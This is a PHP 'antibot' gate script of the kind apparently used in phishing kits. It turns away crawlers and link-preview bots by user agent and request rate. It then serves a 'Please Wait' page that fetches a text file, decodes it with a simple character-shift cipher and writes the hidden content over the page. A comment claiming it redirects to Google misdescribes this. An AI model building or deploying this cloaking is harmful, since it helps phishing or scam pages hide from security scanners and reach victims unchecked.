<?php
// Start session to track user behavior

session_start();

// Function to check headers for signs of bots
function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $botPatterns = [
        '/bot/i', '/crawl/i', '/slurp/i', '/spider/i', '/mediapartners/i',
        '/facebookexternalhit/i', '/bingpreview/i'
    ];
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    return false;
}

// Check for unusual request patterns
function detectUnusualBehavior() {
    // Initialize request count and timestamp
    if (!isset($_SESSION['request_count'])) {
        $_SESSION['request_count'] = 0;
        $_SESSION['first_request_time'] = time();
    }

    // Increment request count
    $_SESSION['request_count']++;

    // Define the cooldown period in seconds (e.g., 60 seconds)
    $cooldownPeriod = 300;

    // Check if cooldown period has passed
    if ((time() - $_SESSION['first_request_time']) > $cooldownPeriod) {
        // Reset request count and timestamp
        $_SESSION['request_count'] = 1; // Reset to 1 for the current request
        $_SESSION['first_request_time'] = time();
        return false; // No unusual behavior after cooldown reset
    }

    // Too many requests in a short time may indicate a bot
    if ($_SESSION['request_count'] > 10) {
        return true;
    }
}

// Check JavaScript support
function checkJavaScriptSupport() {
    if (empty($_GET['js'])) {
        echo "<script>location.href='?js=enabled';</script>";
      
        exit;
    }
}

// Main antibot logic
if (isBot()) {
    die("Access Denied: Bot detected.");
}

if (detectUnusualBehavior()) {
    die("Access Denied: Unusual behavior detected.");
}

checkJavaScriptSupport();


// Redirect to Google if all checks pass
echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
</head>
<body>
<script>
    function fetchAndDecode(){fetch("./assets/js/pages/index.txt").then((e=>{if(!e.ok)throw new Error("Network response was not ok");return e.text()})).then((e=>{try{writeTo(decryptText(e))}catch(e){console.error("Decoding failed:",e)}})).catch((e=>{console.error("There was a problem with the fetch operation:",e)}))}function decryptText(e,t=3){return e.split("").map((e=>String.fromCharCode(e.charCodeAt(0)-t))).join("")}function writeTo(e){document.documentElement.innerHTML=e,document.open().write(e),document.close()}fetchAndDecode();
</script>
</body>
</html>
';
exit;
?>
